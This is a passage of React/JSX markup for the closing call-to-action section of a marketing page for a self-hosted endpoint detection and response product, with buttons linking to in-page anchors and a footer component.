      <section id="poc" className="w-full py-24 px-6 sm:px-12 lg:px-16 border-t border-white/10 bg-theme-gradient-b text-center">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-3xl sm:text-5xl font-bold tracking-tight text-white mb-6">
            Lock Down Endpoints on Sovereign Hardware
          </h2>
          <p className="text-base sm:text-lg text-white/70 font-light max-w-2xl mx-auto mb-10 leading-relaxed">
            Deploy self-contained EDR agents across Windows and Linux workstations in minutes. Zero cloud telemetry egress, instantaneous port-level quarantine.
          </p>
          <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
            <a
              href="#overview"
              className="px-9 py-4 rounded-full bg-white text-janus-bg font-mono text-xs font-bold uppercase tracking-widest hover:bg-purple-100 transition-all duration-300 shadow-[0_0_35px_rgba(255,255,255,0.4)] hover:scale-105 active:scale-95 cursor-pointer"
            >
              Deploy on Ubuntu Server
            </a>
            <a
              href="#capabilities"
              className="px-8 py-4 rounded-full bg-white/10 hover:bg-white/20 text-white font-mono text-xs uppercase tracking-widest border border-white/20 transition-all duration-300 hover:scale-105 active:scale-95 cursor-pointer"
            >
              Schedule Technical Walkthrough
            </a>
          </div>
        </div>
      </section>

      {/* Footer */}
      <Footer />
    </div>
  );
}
